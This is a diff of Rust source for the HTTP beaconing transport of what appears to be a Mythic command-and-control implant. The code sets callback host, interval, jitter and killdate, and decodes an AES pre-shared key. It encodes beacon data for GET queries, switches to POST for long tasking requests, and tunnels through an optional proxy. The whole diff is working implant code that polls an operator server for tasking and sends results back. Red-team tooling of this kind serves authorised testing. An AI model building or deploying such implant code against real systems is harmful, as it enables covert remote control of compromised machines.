@@ -27,31 +27,63 @@ pub struct Http {
     pub proxy_pass: String,
 }
 
+impl Default for Http {
+    fn default() -> Self {
+        Self {
+            aes_psk: String::new(),
+            callback_host: String::new(),
+            callback_port: 80,
+            callback_interval: 10,
+            callback_jitter: 0,
+            encrypted_exchange_check: false,
+            get_uri: String::new(),
+            post_uri: String::new(),
+            query_path_name: String::new(),
+            headers: HashMap::new(),
+            killdate: String::new(),
+            proxy_host: String::new(),
+            proxy_port: String::new(),
+            proxy_user: String::new(),
+            proxy_pass: String::new(),
+        }
+    }
+}
+
 impl Http {
     fn request(&self, method: Method, url: &str, data: &str) -> MythicResult<String> {
         let req = Request::new(method, url).with_headers(&self.headers);
 
         let req = if self.proxy_host.len() > 4 && self.proxy_port.len() > 1 {
             let proxy_url = format!(
-                "socks5://{}:{}@{}:{}",
+                "http://{}:{}@{}:{}",
                 self.proxy_user, self.proxy_pass, self.proxy_host, self.proxy_port
             );
-            let proxy = Proxy::new(proxy_url).map_err(|_| MythicError::transport(1))?;
+            let proxy = Proxy::new(proxy_url).map_err(|_| MythicError::Proxy)?;
             req.with_proxy(proxy)
         } else {
             req
         }
         .with_body(data);
-
-        let resp = req.send().map_err(|_| MythicError::transport(2))?;
-
+        let resp = req
+            .send()
+            .map_err(|e| MythicError::Transport(e.to_string()))?;
         read_response(resp)
     }
 
     fn get(&self, data: &str) -> MythicResult<String> {
+        // Mythic HTTPX expects URL-safe base64 (no padding) in the query string.
+        let urlsafe_data = data
+            .replace('+', "-")
+            .replace('/', "_")
+            .trim_end_matches('=')
+            .to_string();
         let url = format!(
             "{}:{}/{}/?{}={}",
-            self.callback_host, self.callback_port, self.get_uri, self.query_path_name, data
+            self.callback_host,
+            self.callback_port,
+            self.get_uri,
+            self.query_path_name,
+            urlsafe_data
         );
         self.request(Get, &url, "")
     }
@@ -66,14 +98,13 @@ impl Http {
 }
 
 impl C2Trait for Http {
-    fn get_aes_psk(&self) -> [u8; 32] {
-        let aes_psk = base64_decode(&self.aes_psk).unwrap();
-        let aes_psk: [u8; 32] = aes_psk.try_into().unwrap();
-        aes_psk
+    fn get_aes_psk(&self) -> MythicResult<[u8; 32]> {
+        let aes_psk = base64_decode(&self.aes_psk)?;
+        aes_psk.try_into().map_err(|_| MythicError::KeyDerivation)
     }
 
-    fn set_aes_psk(&mut self, key: &str) {
-        self.aes_psk = key.to_string();
+    fn set_aes_psk(&mut self, key: String) {
+        self.aes_psk = key;
     }
 
     fn encrypted_exchange_check(&self) -> bool {
@@ -85,7 +116,11 @@ impl C2Trait for Http {
     }
 
     fn get_tasking(&self, packed: &str) -> MythicResult<String> {
-        self.get(packed)
+        if packed.len() > 512 {
+            self.post(packed)
+        } else {
+            self.get(packed)
+        }
     }
 
     fn post_response(&self, packed: &str) -> MythicResult<String> {
@@ -94,11 +129,16 @@ impl C2Trait for Http {
 }
 
 fn read_response(resp: Response) -> MythicResult<String> {
-    let status = resp.status_code as u16;
-    if status >= 400 {
-        return Err(MythicError::HttpStatus(status));
+    match resp.status_code {
+        429 => return Err(MythicError::RateLimited),
+        status if status >= 500 => return Err(MythicError::Http5XX),
+        status if status >= 400 => return Err(MythicError::Http4XX),
+        _ => {}
     }
     resp.as_str()
-        .map_err(|e| MythicError::transport(format!("{e}")))
+        .map_err(|e| match e {
+            minreq::Error::InvalidUtf8InBody(_) => MythicError::Utf8,
+            other => MythicError::Transport(other.to_string()),
+        })
         .map(|s| s.to_string())
 }
